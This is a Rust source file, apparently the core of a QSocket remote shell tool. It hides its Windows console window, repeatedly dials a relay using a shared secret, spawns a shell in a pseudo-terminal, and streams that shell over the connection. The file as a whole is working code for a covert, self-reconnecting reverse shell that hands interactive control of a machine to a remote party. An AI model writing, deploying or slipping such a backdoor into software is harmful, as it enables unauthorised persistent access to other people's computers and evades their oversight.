#![windows_subsystem = "windows"]

// use anyhow::Result;
use portable_pty::{native_pty_system, CommandBuilder, PtySize};
use std::io::prelude::*;
use std::sync::{Arc, Mutex};
use std::thread;
use std::time;
use std::time::Duration;
mod options;
mod utils;

fn main() -> Result<(), anyhow::Error> {
    let mut opts = options::parse_options()?;

    if opts.generate {
        opts.secret = utils::random_secret();
    }

    if opts.secret.is_empty() {
        // Ask for secret.
        opts.secret = utils::read_line("Enter Secret (or press Enter to generate): ");
        if opts.secret.is_empty() {
            opts.secret = utils::random_secret();
        }
    }
    // print option summary
    options::summarize_options(&opts);
    start_probing_qsrn(&opts)?;

    Ok(())
} // the stream is closed here

fn start_probing_qsrn(opts: &options::Options) -> Result<(), anyhow::Error> {
    let mut first_run = true;

    loop {
        if !first_run {
            std::thread::sleep(time::Duration::from_secs(opts.probe as u64));
        }
        first_run = false;
        let mut qsock = qsocket_rs::Qsocket::new(&opts.secret, qsocket_rs::TAG_ID_NC);
        match qsock.dial(!opts.no_tls, opts.verify_cert) {
            Ok(_) => (),
            Err(_) => continue,
        }
        qsock.set_write_timeout(Some(Duration::new(1, 0)))?;
        qsock.set_read_timeout(Some(Duration::new(1, 0)))?;
        // Init PTY shell
        let pty_system = native_pty_system();
        // Create a new pty
        let mut pair = pty_system
            .openpty(PtySize {
                rows: 30,
                cols: 120,
                pixel_width: 0,
                pixel_height: 0,
            })
            .unwrap();

        // Spawn a shell into the pty
        let cmd = CommandBuilder::new(opts.exec.as_str());
        let mut child = pair.slave.spawn_command(cmd)?;
        // Read and parse output from the pty with reader
        let mut reader = pair.master.try_clone_reader()?;
        let qsock = Arc::new(Mutex::new(qsock));
        let stream1 = qsock.clone();
        let stream2 = qsock.clone();

        thread::spawn(move || loop {
            let mut buf = vec![0; 1024];
            let n = reader.read(&mut buf).unwrap_or(0);
            if n != 0 {
                stream1
                    .lock()
                    .unwrap()
                    .write_all(buf[0..n].as_mut())
                    .unwrap();
            }
        });

        thread::spawn(move || loop {
            std::thread::sleep(Duration::new(0, 100000000)); // Required for preventing mutex dead lock!
            let mut buf = vec![0; 1024];
            let n = stream2.lock().unwrap().read(&mut buf).unwrap_or(0);
            if n != 0 {
                pair.master.write_all(buf[0..n].as_ref()).unwrap();
            }
        });

        child.wait()?;
    }
}
